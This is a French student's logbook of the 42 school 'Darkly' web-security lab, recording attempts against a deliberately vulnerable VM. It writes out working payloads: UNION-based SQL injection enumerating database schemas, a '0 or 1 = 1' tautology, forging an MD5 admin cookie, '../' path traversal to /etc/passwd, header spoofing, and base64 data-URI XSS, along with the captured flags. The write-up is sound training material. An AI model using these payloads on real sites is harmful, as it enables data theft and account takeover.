# darkly
projet de web secu de 42


les faille que je prevois de croiser :
- injection sql sur une recherche 
- injection sql sur login
- injeciton de donner sur l upload dimage
- injection js
- injection php (j ai croiser ca sur internet mais je ne suis pas sur de ocomment ca marche)
- manipulation de cookie

# 29novembre :
je comprend comment lancer la machine grace a ce lien que de sympathique gens m on donner sur discord 
https://github.com/AdonisEnProvence/Darkly#setup
je me rend compte que les recherche de photos et d user renvois des erreurs sql 
il y a probablement moyen d y injecter des choses
je testes des trucs

# 30 novembre : 
je test plein de solution dinjeciton sql et une trouver sur se stie touche enfin 
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
 ## 0 UNION ALL SELECT NULL,version()-- 
c est top ca renvoi la version qui est : 5.5.64-MariaDB-1ubuntu0.14.04.1
 ## 0 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
me donne les nom de database suivant :
- information_schema
- Member_Brute_Force
- Member_Sql_Injection
- Member_guestbook
- Member_images
- Member_survey

0 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM images.TABLES --

je ne comprend pas les member machin ils ne retourne rien
## 0 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES --
je recupere plein de truc mais je ne sait pas quoi en faire

USER_STATISTICS

 0 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='USER_STATISTICS'--

## 0 UNION ALL SELECT NULL,concat(column_name) FROM guestbook.COLUMNS --
me donne toute les columns existante
visiblement http://192.168.56.101/index.php?page=member
et http://192.168.56.101/index.php?page=searchimg
n on pas le meme fonctionnement

# 1 decembre:

## 0 or 1 = 1;

me retourn des infos bien plus interessante dans le user .

je supose que la query sur le serveur ressemble a 

### SELECT * FROM user WHERE user_id = (what i typing);


en parallel j ai tester un outil qui etais sencer brut force les mdp mais il me dit que tout les mot de passe de ca liste sont bon .... 


je pensse que j ai foirer un truc donc je vais fair mon propre outil </br>
il me suiffit de remplacer </br>
http://192.168.56.101/?page=signin&username=d&password=d&Login=Login# </br>
par les username et password de mon choix (je crois je ne comprend pas l interet de Login) </br>
j ai essayer de le mettre a true mais rien ne se passe </br>

## 1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema = database(); 
me renvoi user je ne suis pas sur de situer la difference entre concat et gorup concate


# 15 decembre 

j ai mit en place un moyen avec fetch de brutforce le site

arriver tongyu qui me montre une super faile coter http://192.168.56.101/index.php?page=survey#
il suffit de changer les valeur dans les option et on optien le flags :
``` 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa```
izi


en decryptant le cooki en md5 on trouve false je supose donc que l on peu encrypter la chaine true pour devenire admin 
se qui fonctionne et me permet donc de trouver le flag : ``` df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3 ```

dans
http://192.168.56.101/?page=feedback
en rentrans une balise html style <h1>test</h1>
on obtien le flag : 
```0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E```


# 3 janvier 

je teste un truc on cherche le /etc/passwd le serveur renvois wtf je tente un ../etc/passwd et il renvoie un nouveaux message
je copie colle plein de ../ et j obtien <br/>

Congratulaton!! The flag is : 
```b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ```


en visitant la page http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f (oou en cliquant sur le @ tout en bas de la home page)

on tombe sur un truc avec un albatros . la console de cette page renvois une erreur : '?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f:39 Uncaught (in promise) DOMException: play() failed because the user didn't interact with the document first. https://goo.gl/xX8pDD' <br/>
je vais donc sur la ressource
j avais de la mmusic qui etais jouer mais en rechargeant la page impossible d en avoir plus
j ai trouver la music mais ca ne me donne rien quand on cli dessus ca renvois vers une video youtube de aaronchupa
j ai changer le onload en on click car en bref chrome ne laisse pas le contenus se lancer si l utilisateur n interagie pas avec .

dans le html cmmenter je trouve un text qui dit : u must come frome https://www.nsa.gov/

je tente de faire unpetit programme qui avec node et fetche pour qu il utiliser les bonnes donner dans le header 
dapres se site : https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers je peu faire croire que je viens du bon site avec le parametre 'Referer' 
je tombe sur un texte qui dt : 'et's use this browser : "ft_bornToSec". It will help you a lot.'
en fouillant toujour sur le meme site je trouve *User-Agent* 

# 5 janvier

quand on clique sur l image nasa on trouve se lien http://192.168.56.101/?page=media&src=nsa

on peu donc suposer qu il charge les document depuis le serveur qui sont situer dans src (donc qui l execute)

en bref je tente ca http://192.168.56.101/?page=media&src=Montpellier%3Cscript%3Ealert(document.cookie);%3C/script%3E ca renvoie un truc super bizzare un sorry wrong answer et un 404 not found en meme temps


je pensse que je suis bloquer par une relecture de mon js par le serveur 


j ai trouver ca j ai pas trops compris mais si ca permet de bypasse le truc qui lis mon js et qui le vire autemps tenter
https://github.com/nhn/tui.editor/issues/1717


ici : http://192.168.56.101/?page=media&src=data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x


ca me dit  : le plugin nest pas supporter a la place du 404 error abithuelle

bref je suis sur la bonne vois je tente donc des recherch et je fait un ctrlf 'data:'  sur https://owasp.org/www-community/attacks/xss/

je crois que j ai gagner

je tente dencode `<script>alert('coucou')</script>`  en base 64 ca me donne :  PHNjcmlwdD5hbGVydCgnY291Y291Jyk8L3NjcmlwdD4=

http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnY291Y291Jyk8L3NjcmlwdD4=

BIM le flag :
`928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D`
